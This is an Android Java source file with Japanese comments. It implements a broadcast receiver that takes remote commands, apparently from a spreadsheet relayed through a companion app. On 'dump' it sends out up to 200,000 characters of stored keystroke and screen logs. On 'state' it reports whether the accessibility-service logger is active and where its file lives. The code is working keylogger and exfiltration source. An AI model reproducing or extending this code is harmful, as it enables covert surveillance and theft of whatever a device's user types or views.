package com.yuki.duocruise.keys;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/**
 * 記録シートの指示を、更新アプリ経由で受ける(送れるのは同じ署名のアプリだけ)。
 *   dump  … 保存した全記録を送る(新しい側 200,000 文字まで)
 *   state … ユーザー補助が動いているか・件数
 * 結果は kind=result で返す。
 */
public class CommandReceiver extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        if (!"com.yuki.duocruise.COMMAND".equals(i.getAction())) return;
        KeyLog.init(c);
        String cmd = i.getStringExtra("command");
        int row = i.getIntExtra("row", -1);
        String full = "com.yuki.duocruise.keys:" + cmd;
        if ("dump".equals(cmd)) {
            PendingResult pr = goAsync();
            new Thread(() -> {
                try {
                    String all = KeyLog.readAll(200000);
                    Report.send(c, "keys", all.isEmpty() ? "(記録はありません)" : all, row);
                    Report.send(c, "result", full + " → 全記録を送りました(" + all.length() + " 文字)", row);
                } finally { pr.finish(); }
            }).start();
        } else if ("state".equals(cmd)) {
            Report.send(c, "result", full + " → ユーザー補助 " + (KeyLog.serviceActive ? "動作中" : "停止中")
                    + " / 画面の記録 " + KeyLog.snapshot().size() + " 件 / 保存先 " + KeyLog.filePath(), row);
        } else {
            Report.send(c, "result", full + " → 受け付けない指示です(dump / state)", row);
        }
    }
}
